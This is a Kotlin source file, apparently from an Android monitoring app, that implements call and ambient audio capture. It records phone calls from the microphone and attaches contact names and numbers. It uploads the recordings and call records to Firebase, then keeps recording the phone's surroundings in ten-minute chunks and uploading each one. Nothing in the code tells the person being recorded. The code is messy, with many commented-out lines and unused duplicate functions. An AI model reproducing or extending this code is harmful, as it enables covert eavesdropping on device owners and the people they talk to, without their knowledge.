package com.github.midros.istheapp.services.calls

import android.content.Context
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.util.Log
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.data.model.Calls
import com.github.midros.istheapp.data.model.Recording
import com.github.midros.istheapp.services.base.BaseInteractorService
import com.github.midros.istheapp.utils.*
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.isAndroidM
import com.github.midros.istheapp.utils.Consts.ADDRESS_AUDIO_CALLS
import com.github.midros.istheapp.utils.Consts.CALLS
import com.github.midros.istheapp.utils.Consts.DATA
import com.github.midros.istheapp.utils.FileHelper.getFileNameCall
import com.github.midros.istheapp.utils.FileHelper.getContactName
import com.github.midros.istheapp.utils.FileHelper.getDurationFile
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
    context: Context,
    firebase: InterfaceFirebase
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var recorder: MediaRecorderUtils = MediaRecorderUtils { deleteFile() }
    private var fileName: String? = null
    private var contact: String? = null
    private var phoneNumber: String? = null
    private var type: Int = 0
    private var recording: Int = 0
    private var dateTime: String? = null
    private var fileName2: String? = null
    private var nameAudio: String = ""
    private var timer2: MyCountDownTimer? = null
    override fun startRecording(phoneNumber: String?, type: Int) {

        this.type = type
        this.phoneNumber = phoneNumber
        dateTime = getDateTime()
        contact = getContext().getContactName(phoneNumber)
        fileName = getContext().getFileNameCall(phoneNumber, dateTime)
        Log.i("llamada", "startRecording")
    ///    if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
            recording = 1
            if (isAndroidM())
                recorder.startRecording( MediaRecorder.AudioSource.MIC,  fileName  ) //.VOICE_COMMUNICATION
            else
                recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
//        }
//        else
//            recording = 0
    }

    override fun stopRecording() {
        if (recording == 1)
            recorder.stopRecording { sendFileCall() }
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        if (recording == 1)
            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
        recording = 0
        if (getService() != null)
            getService()!!.stopServiceCalls()
    }

    private fun sendFileCall0() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val dateNumber = fileName!!.replace("$filePath/", "").replace(",","")
        val uri = Uri.fromFile(File(fileName))
        getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({
                setPushName()
                       },
                {
                deleteFile()
            })
        )
    }
    private fun sendFileCall() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val dateNumber = fileName!!.replace("$filePath/", "")  //.replace(",","")
        val uri = Uri.fromFile(File(fileName))
        //    val recording = Recording(nameAudio, dateTime, duration)
        getService()!!.addDisposable(firebase().putFile("${Consts.RECORDING}/$dateNumber", uri)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({
                setPushName()
                sendFileCallRecording()
                //     startRecording("Despues de llamada", 1)
               //     recording()
            },
                {
                    //deleteFile()
                    val fileNameDest = fileName!!.replace("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/","/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecords/")
                    File(fileName).let { sourceFile ->
                        sourceFile.copyTo(File(fileNameDest))
                        sourceFile.delete()
                    }
                    recording()
                })
        )
    }
    private fun sendFileCallRecording() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val dateNumber = fileName!!.replace("$filePath/", "") //.replace(",","")
        val uri = Uri.fromFile(File(fileName))
        //    val recording = Recording(nameAudio, dateTime, duration)
        getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({
                //   setPushName()
                //           startRecording("Despues de llamada", 1)
            recording()
            },
                {
                    //deleteFile()
                    val fileNameDest = fileName!!.replace("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/","/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecords/")
                    File(fileName).let { sourceFile ->
                        sourceFile.copyTo(File(fileNameDest))
                        sourceFile.delete()
                    }
                    recording()
                })
        )
    }
    private fun sendFileCall2() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val ss = fileName2!!.split('/').size
        val dateNumber = fileName2!!.split("/")[ss-1]
        // val dateNumber = fileName2!!.split("/")
        val uri = Uri.fromFile(File(fileName2))
        //    val recording = Recording(nameAudio, dateTime, duration)
        val ff = fileName2!!.split('/')[ss-1]
        getService()!!.addDisposable(firebase().putFile("${Consts.RECORDING}/$ff", uri)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({
                setPushName2()
                deleteFile()
                //     startRecording("Despues de llamada", 1)

             recording()
            },
                {
                    //deleteFile()
                    val fileNameDest = fileName2!!.replace("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/","/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecords/")
                    File(fileName2).let { sourceFile ->
                        sourceFile.copyTo(File(fileNameDest))
                        sourceFile.delete()
                    }
                    File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
                    recording()
                })
        )
    }
    private fun recording(){
        try {
            if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
                nameAudio = ConstFun.getRandomNumeric()
                dateTime = ConstFun.getDateTime() //.replace(":", "-") //.replace(".", "")
                fileName2 =  "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" + dateTime + "--.mp3" //context.getFileNameAudio(nameAudio, dateTime)
                //                 File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").createNewFile()
                recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName2)
                timer2 = MyCountDownTimer(10 * 60 * 1000, (1000 * 60).toLong(), { // 1 min = 60 * 1000
                    Log.i(Consts.TAG, "call recive...");
                }) {
                    Log.i(Consts.TAG, "fin recording call recibe") ;
                    recorder.stopRecording {
                        //      sendFileCall()
//                        val fileNameDest = fileName2!!.replace("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/","/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecords/")
//                        File(fileName2).let { sourceFile ->
//                            sourceFile.copyTo(File(fileNameDest))
//                            sourceFile.delete()
//                        }
                        sendFileCall2()
                //        recording()
                    }
                    Log.i("finishRecording", "finishRecording")
                }
                timer2!!.start()
                Log.i(Consts.TAG, "inicia timer ");
                //  }
            }
        } catch (e: Throwable) {
//            sendFile()
            Log.i("error recording call", e.message.toString())
            //        e(Consts.TAG, e.message.toString())
            //  errorAction()
        }
    }

    private fun setPushName() {
        val duration = getDurationFile(fileName!!)
        File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
        //    recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
        val calls = Calls(contact, phoneNumber, dateTime, duration, type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        //  firebase.putFile("$RECORDING/$dateName", uri)    //02 dic. 2022 04:57 p. m.-1670018233052.mp3
        // val recording = Recording(nameAudio, dateTime, duration) //1670018233052
        val recording = Recording(contact, dateTime, duration)
        //firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
        firebase().getDatabaseReference("${Consts.RECORDING}/$DATA").push().setValue(recording)
    //    deleteFile()
    }
    private fun setPushName2() {
        val duration = getDurationFile(fileName2!!)
        File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
        val ss = fileName2!!.split('/').size
        val ff = fileName2!!.split('/')[ss-1]
        val recording = Recording(ff.replace(".mp3",""), dateTime, duration)
        //firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
        firebase().getDatabaseReference("${Consts.RECORDING}/$DATA").push().setValue(recording)
        //    deleteFile()
    }
    private fun setPushName0() {
        val duration = getDurationFile(fileName!!)
        val calls = Calls(contact, phoneNumber, dateTime, duration, type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }
}